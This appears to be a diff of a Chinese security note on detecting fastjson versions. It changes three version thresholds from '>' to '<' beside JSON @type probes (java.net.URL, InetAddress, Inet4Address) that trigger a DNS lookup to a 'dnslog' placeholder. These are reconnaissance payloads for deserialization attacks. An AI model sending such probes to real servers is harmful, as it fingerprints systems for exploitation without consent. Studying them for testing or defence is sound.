@@ -37,19 +37,19 @@ fastjson探测版本，还可以用错误格式的json发过去。如果对方�
 
 主要是利用各个类被加入黑名单的方式进行判断
 
-fastjson >1.2.43
+fastjson <1.2.43
 
 ```java
 {"@type":"java.net.URL","val":"dnslog"}
 ```
 
-fastjson >1.2.48
+fastjson <1.2.48
 
 ```java
 {"@type":"java.net.InetAddress","val":"dnslog"}
 ```
 
-fastjson >1.2.68
+fastjson <1.2.68
 
 ```java
 {"@type":"java.net.Inet4Address","val":"dnslog"}
